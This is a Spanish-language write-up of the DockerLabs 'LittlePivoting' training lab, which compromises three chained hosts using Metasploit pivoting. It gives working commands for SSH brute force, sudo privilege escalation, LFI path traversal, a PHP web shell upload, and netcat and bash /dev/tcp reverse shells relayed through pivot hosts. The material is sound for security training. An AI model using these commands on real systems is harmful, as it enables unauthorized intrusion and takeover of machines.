---
title: "LittlePivoting Dockerlabs (Resolución con Metasploit)"
date: 2026-09-29
categories: [CTF, Dockerlabs]
tags: [medium, pivoting, metasploit, LFI, eJPTv2, fileUpload]
---

- - -

## Introducción 

- - -

![captura](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/00-DiagramaRed-LittlePivoting-DockerLabs.png)


Este laboratorio de la plataforma DockerLabs despliega un entorno segmentado en múltiples redes, diseñado específicamente para practicar técnicas de pivoting y reconocimiento de cara a la preparación de la certificación eJPTv2. A lo largo de este writeup, y haciéndolo íntegramente con Metasploit tal y como se espera en la certificación, veremos cómo escalar privilegios, descubrir subredes internas ocultas y realizar un reenvío de puertos (port forwarding) avanzado para comprometer hosts sucesivos.

### Despliegue de laboratorio

![captura](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/01-captura.png)

#### Test de conectividad

![captura](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/02-captura.png)

Únicamente tenemos conectividad con el primer segmento de red, 10.10.10.0/24, concretamente con la máquina víctima 10.10.10.2, así que comenzaremos por ella.

## 10.10.10.2 (Máquina Trust)

- - -

### Reconocimiento

#### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.2 -oN allPorts 
```

```bash
grep '^[0-9]' allPorts| cut -d '/' -f1 | xargs | sort | tr ' ' ','
```

```bash
nmap -p22,80 -sCV 10.10.10.2 -oN targeted
```

![Escaneo de puertos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/03-escaneo-de-puertos.png)

Vemos que tiene expuestos un servicio SSH y otro servicio *HTTP*. Vamos a enumerar el servicio web, ya que el servicio SSH no es vulnerable a la enumeración de usuarios (las versiones <7.7 sí lo son).

### Enumeración

#### Enumeración de servicio HTTP

```bash
nmap -p80 --script http-enum 10.10.10.2 -oN webScan
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/04-enumeracion-de-servicio-http.png)

```bash
whatweb 10.10.10.2
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/05-enumeracion-de-servicio-http.png)

Al acceder a la página web desde el navegador, encontramos una instalación de Apache por defecto. En este punto, vamos a aplicar fuzzing para descubrir rutas y directorios.

```bash
gobuster dir -u http://10.10.10.2 -w /usr/share/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,bak -t 20
```

![Enumeración de servicio HTTP](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/06-enumeracion-de-servicio-http.png)

Encontramos el archivo *secret.php* en la raíz del servicio web. Vamos a comprobar su contenido:

![Enumeración de servicio HTTP](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/07-enumeracion-de-servicio-http.png)

Encontramos este mensaje, por lo que podemos deducir que «mario» podría ser un nombre de usuario válido para el servicio *SSH*. Podemos lanzar un ataque de fuerza bruta mientras continuamos con la enumeración.

#### Ataque de fuerza bruta al servicio SSH

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
```

![Ataque de fuerza bruta al servicio SSH](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/08-ataque-de-fuerza-bruta.png)
Estábamos en lo cierto: mario era un usuario válido y su credencial es chocolate. Vamos a proceder con el acceso a la máquina.

```bash
ssh mario@10.10.10.2
```

### Enumeración local

Tras obtener acceso a la máquina, ejecutamos los primeros comandos de enumeración local en busca de una vía para escalar privilegios y encontramos lo siguiente:

![Enumeración local](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/09-enumeracion-local.png)

### Escalada de privilegios

#### Abuso de privilegios a nivel de **sudoers**

El usuario «mario» puede ejecutar el binario «vim» como cualquier usuario del sistema gracias a los permisos *sudo*. Sabiendo esto, podemos aprovechar esta configuración para escalar privilegios desde su interfaz de terminal:

```bash
sudo vim test

# una vez dentro de su TUI (terminal user interface) ejecutamos el comando

:!/bin/bash -p
```

![una vez dentro de su TUI (terminal user interface) ejecutamos el comando](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/10-una-vez-dentro-de.png)

De esta manera, habríamos comprometido la máquina víctima y obtenido privilegios de administrador. Tras esto, al enumerar sus interfaces de red, descubrimos lo siguiente:

```bash
hostname -I
```

![una vez dentro de su TUI (terminal user interface) ejecutamos el comando](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/11-una-vez-dentro-de.png)

La máquina víctima cuenta con dos interfaces de red. La segunda se encuentra en el segmento interno *20.20.20.0/24*, lo que indica que podría haber más máquinas víctima en él.

## Persistencia en 10.10.10.2

Antes de aplicar *Host Discovery*, vamos a garantizar la persistencia compartiendo nuestra clave pública con la máquina víctima:

```bash
ssh-keygen # generamos par de claves pública privada 

catn /root/.ssh/id_rsa.pub
```

Una vez generada, la copiamos al archivo */root/.ssh/authorized_keys* de la máquina víctima y comprobamos su funcionamiento:

```bash
ssh root@10.10.10.2
```

## Host Discovery en segmento 20.20.20.0/24

Una vez garantizada la persistencia en la primera máquina víctima, podemos tratar de descubrir nuevos hosts en el segmento de red interno. Para ello podríamos crear un pequeño script de Bash, pero utilizaremos un **Ping Sweep OneLiner**.

```bash
for i in {1..254}; do (ping -c 1 20.20.20.$i | grep "bytes from" &) done
```

![HostDiscovery en segmento 20.20.20.0/24](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/12-hostdiscovery-en-segmento-202020024.png)

De esta manera, descubrimos que existe otro host en el segmento de red, la IP *20.20.20.3*. Para llegar a ella, vamos a necesitar poner en práctica el **pivoting**, que podemos aplicar de forma manual con *chisel* y *socat* o de forma automatizada con **Metasploit**. En este caso, lo haremos de ambas formas: primero con **Metasploit** y después de forma manual con *chisel* y *socat*.

## Pivoting hacia la subred 20.20.20.0/24 con **Metasploit**

Para ello, lo primero será obtener una shell de tipo *meterpreter* en la máquina comprometida. Podemos hacerlo poniéndonos a la escucha con el *multi/handler* de **Metasploit** para recibir una shell normal y elevarla posteriormente a *meterpreter*:

```bash
msfconsole 
```

Una vez iniciado **Metasploit**, utilizaremos el módulo *multi/handler* con los siguientes parámetros configurados:

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/13-pivoting-hacia-la-subred.png)

Lo ejecutamos y, desde la máquina comprometida, lanzamos la *reverse shell* con Netcat.

```bash
nc 10.0.2.15 443 -e /bin/bash
```

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/14-pivoting-hacia-la-subred.png)

Recibimos la shell, enviamos la sesión al *background* (`Ctrl + Z`) y, para elevarla a una shell de tipo *meterpreter*, utilizaremos el módulo *shell_to_meterpreter*.

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/15-pivoting-hacia-la-subred.png)

Ejecutamos el módulo:

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/16-pivoting-hacia-la-subred.png)

De esta forma, obtenemos una shell de tipo **meterpreter** en la máquina víctima comprometida. Con esta shell, podemos utilizar el módulo _multi/manage/autoroute_ para añadir a la tabla de enrutamiento de **Metasploit** la ruta al nuevo segmento de red descubierto, utilizando esta nueva sesión de *meterpreter*.

```bash
use multi/manage/autoroute
```

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/17-pivoting-hacia-la-subred.png)

Lo ejecutamos:

![Pivoting hacia la subred 20.20.20.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/18-pivoting-hacia-la-subred.png)

Una vez hecho esto, se añaden las rutas hacia el nuevo segmento de red en el contexto de **Metasploit**. Desde nuestra máquina atacante no tendremos acceso directo en este punto.

## 20.20.20.3 (Máquina Include)

- - -

### Reconocimiento

#### Escaneo de puertos

Podemos proceder con el escaneo de puertos desde **Metasploit**, utilizando el módulo *scanner/portscan/tcp*: 

![Escaneo de puertos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/19-escaneo-de-puertos.png)

Encontramos el puerto 80 abierto, lo que nos hace pensar en un servicio *HTTP*, y el puerto 22, que a su vez nos hace pensar en un servicio *SSH*. El inconveniente es que desde nuestra máquina atacante no tenemos acceso directo a estos servicios expuestos en la máquina víctima de la subred. Para poder acceder a ellos, podemos realizar un *Port Forwarding* y traer estos puertos a nuestra máquina atacante.

#### Port Forwarding con **Metasploit**

Para ello, utilizaremos la herramienta *portfwd* desde la shell de tipo *meterpreter* que obtuvimos anteriormente:

```bash
sessions 
sessions -i 2 
```

Una vez dentro, vamos a traer los puertos 80 y 22 de la máquina víctima utilizando esta herramienta:

```bash
portfwd add -l 8080 -p 80 -r 20.20.20.3
portfwd add -l 2222 -p 22 -r 20.20.20.3
```

![Escaneo de puertos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/20-escaneo-de-puertos.png)

A diferencia de *autoroute*, este *port forwarding* sí se aplica fuera de **Metasploit**. Por ello, desde el navegador podemos acceder al servicio web mediante nuestro *localhost* en el puerto 8080.

### Enumeración

#### Enumeración del servicio HTTP

![Enumeración del servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/21-enumeracion-del-servicio-http.png)

A priori, parece tratarse de una instalación por defecto de Apache2.

```bash
whatweb http://127.0.0.1:8080
```

![Enumeración del servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/22-enumeracion-del-servicio-http.png)

```bash
nmap -p8080 --script http-enum 127.0.0.1 -oN webScan
```

![Enumeración del servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/23-enumeracion-del-servicio-http.png)

Descubrimos un directorio «*/shop*». Vamos a comprobar su contenido.

![Enumeración del servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/24-enumeracion-del-servicio-http.png)

En la ruta descubierta se muestra un error, por lo que parece estar esperando un archivo como parámetro en la URL mediante el método GET. Lo primero que debemos considerar es un posible LFI:

```http
http://localhost:8080/shop/index.php?archivo=/etc/passwd
```

![Enumeración del servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/25-enumeracion-del-servicio-http.png)

Parece que no sucede nada.

### Explotación de LFI

Es posible que el código PHP esté forzando a que el archivo interpretado en el servicio web se encuentre en la ruta */var/ww/html*. Para escapar de esta restricción, podemos tratar de aplicar un **Undirectory Path Traversal**:

```http
http://localhost:8080/shop/index.php?archivo=../../../../etc/passwd
```

![Explotación de LFI](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/26-explotacion-de-lfi.png)

Efectivamente, de esta forma logramos explotar el **LFI** e incluir el archivo */etc/passwd*. En el contenido encontramos varios usuarios con una Bash asignada, entre ellos seller y manchi, a los que podemos aplicar un ataque de fuerza bruta en el servicio SSH.

#### Ataque de fuerza bruta al servicio SSH

```bash
hydra -l seller -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2222

hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:2222
```

![Ataque de fuerza bruta al servicio SSH](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/28-ataque-de-fuerza-bruta.png)

Encontramos la credencial del usuario manchi. Vamos a acceder al sistema.

```bash
ssh manchi@127.0.0.1 -p 2222
```

![Ataque de fuerza bruta al servicio SSH](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/29-ataque-de-fuerza-bruta.png)

### Enumeración local

Tras buscar formas de escalar privilegios con el usuario manchi, no encontramos ninguna. Por ello, vamos a pivotar al usuario seller y tratar de escalar privilegios desde él. Para ello, utilizaremos esta [herramienta](https://github.com/nohh022/bruteForce), que aplica un ataque de fuerza bruta para averiguar las credenciales de usuarios locales en sistemas Linux.

```bash
wget https://raw.githubusercontent.com/nohh022/bruteForce/refs/heads/main/force.sh
```

```bash
# desde nuestra máquina atacante
scp /usr/share/wordlists/rockyou.txt manchi@127.0.0.1:/tmp/rockyou.txt -p 2222
```

![desde nuestra máquina atacante](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/30-desde-nuestra-maquina-atacante.png)

Una vez hecho esto, la ejecutamos:

```bash
./force.sh seller rockyou.txt
```

![desde nuestra máquina atacante](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/31-desde-nuestra-maquina-atacante.png)

De esta forma, averiguamos la credencial y podemos cambiar al usuario seller.

```bash
su seller
```

![desde nuestra máquina atacante](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/32-desde-nuestra-maquina-atacante.png)

### Escalada de Privilegios

#### Abuso de privilegios a nivel de **sudoers**

Una vez cambiamos al usuario seller, vemos que puede ejecutar como *sudoer* el binario de PHP. Podemos apoyarnos en [GTFOBins](https://gtfobins.org/) para escalar privilegios en esta situación.

```bash
sudo php -r 'system("/bin/bash -p");'
```

![desde nuestra máquina atacante](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/33-desde-nuestra-maquina-atacante.png)

De esta manera, habríamos comprometido la máquina con IP 10.10.10.2. Si nos fijamos en sus interfaces de red, veremos lo siguiente:

```bash
hostname -I
```

![desde nuestra máquina atacante](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/34-desde-nuestra-maquina-atacante.png)

Antes de comenzar con la fase de descubrimiento de hosts en el nuevo segmento de red, vamos a garantizar la persistencia.

## Persistencia en 20.20.20.3

Debido a la configuración del servicio **SSH**, no podemos utilizar un par de claves pública-privada para autenticarnos y obtener acceso rápido a la máquina víctima. Por ello, podemos cambiar la contraseña del usuario root y utilizarla cada vez que necesitemos acceder.

```bash
passwd root
```

## Host Discovery en segmento 30.30.30.0/24

De nuevo, para descubrir nuevos hosts en la subred descubierta, utilizaremos un **Ping Sweep OneLiner**.

```bash
for i in {1..254}; do (ping -c 1 30.30.30.$i | grep -i "Bytes From" &); done 
```

![HostDiscovery en segemento 30.30.30.0/24](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/35-hostdiscovery-en-segemento-303030024.png)

Descubrimos el host *30.30.30.3/24*. Para llegar a él, una vez más tendremos que utilizar **Metasploit** para aplicar pivoting. Lo primero será obtener una *shell* de tipo *meterpreter* en la máquina *20.20.20.3*.

## Pivoting hacia la subred 30.30.30.0/24 con **Metasploit**

Para llegar a esta subred, primero necesitamos obtener una sesión de *meterpreter* en `20.20.20.3` (Include), ya que solo desde ahí se puede alcanzar `30.30.30.0/24`. El problema es que Include no tiene conectividad directa con nuestra máquina atacante: solo puede alcanzar a `10.10.10.2` (Trust), que sí puede comunicarse con nosotros.

La solución consiste en encadenar un **port forwarding en modo reverso** (`-R`) desde la sesión de *meterpreter* que ya tenemos en Trust: la víctima se conecta al pivote (Trust) y el pivote redirige esa conexión hasta nuestro equipo atacante.

Para ello, desde la sesión de *meterpreter* en la máquina 10.10.10.2, ejecutamos:

```bash
portfwd add -R -l 4444 -p 4444 -L 10.0.2.15
```

![Pivoting hacia la subred 30.30.30.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/36-pivoting-hacia-la-subred.png)

Con esto, Trust queda escuchando en el puerto `4444` y reenvía cualquier conexión entrante hacia el `4444` de nuestra máquina atacante (`10.0.2.15`). A diferencia de un `portfwd` normal, que expone un puerto *remoto* en nuestra máquina *local*, el modo `-R` hace lo contrario: expone un puerto local nuestro *a través* del pivote para que la víctima se conecte a él como si fuera una conexión directa.

Desde **Metasploit**, nos ponemos a la escucha en el puerto 4444 con el módulo **multi/handler** y, desde la 20.20.20.3, lanzamos la *reverse shell* de la siguiente manera:

```bash
bash -i >& /dev/tcp/20.20.20.2/4444 0>&1
```

![Pivoting hacia la subred 30.30.30.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/37-pivoting-hacia-la-subred.png)

De esta forma, obtenemos la *reverse shell* en **Metasploit** y repetimos el procedimiento para elevar la shell a una *meterpreter*, utilizando el módulo *shell_to_meterpreter*.

![Pivoting hacia la subred 30.30.30.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/38-pivoting-hacia-la-subred.png)

Al utilizar el módulo *shell_to_meterpreter* en estos casos, es necesario establecer como LHOST la interfaz más cercana a nuestra red desde la máquina víctima. En este caso, para la 20.20.20.3, será la 20.20.20.2 de la máquina Trust (10.10.10.2).

La línea clave es **`via the meterpreter on session 2`**: el handler no escucha directamente en nuestra red, sino que usa como túnel la sesión de meterpreter que ya teníamos en Trust. Esto es posible porque antes creamos una ruta con `autoroute` hacia `20.20.20.0/24` sobre esa misma sesión — y esa ruta la puede reutilizar **cualquier módulo de Metasploit**, no solo los escaneos manuales.

En este punto, podemos utilizar *autoroute* para crear las reglas de enrutamiento hacia el segmento *30.30.30.0/24* y utilizar el módulo _scanner/portscan/tcp_ para escanear la víctima 30.30.30.3.

![Pivoting hacia la subred 30.30.30.0/24 con metasploit](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/39-pivoting-hacia-la-subred.png)

## 30.30.30.3 (Máquina Upload)

- - -

### Fase de Reconocimiento

#### Escaneo de puertos

![Escaneo de puertos ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/40-escaneo-de-puertos.png)

En este punto, debemos traer el puerto 80 de la máquina 30.30.30.3 a un puerto de nuestra máquina. Para ello, utilizamos la herramienta *portfwd* de **Metasploit**.

```bash
# nos metemos en la sesión 4
sessions -i 4
portfwd add -l 8081 -p 80 -r 30.30.30.3
```

![nos metemos en la sesión 4](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/41-nos-metemos-en-la.png)

Una vez hecho esto, podemos acceder al servicio web de la última máquina víctima a través del navegador.

### Enumeración

#### Enumeración del servicio HTTP

![Enumeración de servicio HTTP ](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/42-enumeracion-de-servicio-http.png)

Vemos un formulario de subida de archivos. Lo primero que podemos intentar es subir un archivo PHP para comprobar qué respuesta obtenemos de la aplicación web.

```php
<?php system($_GET['cmd']); ?>
```

### Abuso de subida de archivos

![Abuso de subida de archivos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/43-abuso-de-subida-de.png)

A priori, no hubo problema. Solo quedaría encontrar la ruta en la que se subió el archivo. Vamos a probar primero con */uploads*:

![Abuso de subida de archivos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/44-abuso-de-subida-de.png)

Y, efectivamente, el archivo se sube al directorio */uploads* y nuestra *webShell.php* es interpretada, consiguiendo un **RCE**. En este punto, debemos plantearnos cómo lanzar una *Reverse Shell* de forma que llegue a nuestra máquina atacante. Para ello, necesitaremos utilizar el modo reverso de *portfwd*. La comunicación será:

> 30.30.30.3 → 30.30.30.2 → 20.20.20.2 → 10.0.2.15 

Es decir, la conexión pasará por dos máquinas intermedias en las que tenemos sesiones *meterpreter*. La primera configuración será en la sesión 4, que corresponde a la máquina Include (20.20.20.3):

```bash
portfwd add -R -l 5555 -p 5555 -L 20.20.20.2
```

Esto pone a la escucha el puerto 5555 de la máquina Include (20.20.20.3), esperando la *reverse shell* proveniente de la 30.30.30.3, y redirige la conexión al puerto 5555 de la máquina Trust. A su vez, tendremos que configurar la siguiente redirección en la sesión 2:

```bash
portfwd add -R -l 5555 -p 5555 -L 10.0.2.15
```

![Abuso de subida de archivos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/45-abuso-de-subida-de.png)

En este puerto estaremos a la escucha en nuestra máquina atacante con el módulo *multi/handler*, donde recibiremos la shell para operar con ella.

![Abuso de subida de archivos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/46-abuso-de-subida-de.png)

Para lanzar la *reverse shell* desde la *webShell*, ejecutaremos:

```bash
bash -c 'bash -i >%26 /dev/tcp/30.30.30.2/5555 0>%261'
```

Vamos a ejecutarlo:

![Abuso de subida de archivos](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/47-abuso-de-subida-de.png)

De esta forma, conseguimos una *reverse shell* que pasa por dos máquinas intermedias utilizando **Metasploit**. En este punto, podemos proceder con la enumeración local para buscar una vía de escalada de privilegios en la última máquina víctima.

### Enumeración local

Una vez dentro, vemos lo siguiente:

![Enumeración local](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/48-enumeracion-local.png)

### Escalada de privilegios

#### Abuso de privilegios a nivel de **sudoers**

Apoyándonos en [GTFOBins](https://gtfobins.org/), podemos consultar formas de escalar privilegios con este binario.

![Enumeración local](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/49-enumeracion-local.png)

```bash
sudo env /bin/bash
```

![Enumeración local](/assets/img/posts/2026-09-29-littlepivoting-pivoting-metasploit/50-enumeracion-local.png)

Una vez hecho esto, habremos completado el laboratorio de LittlePivoting con **Metasploit**.
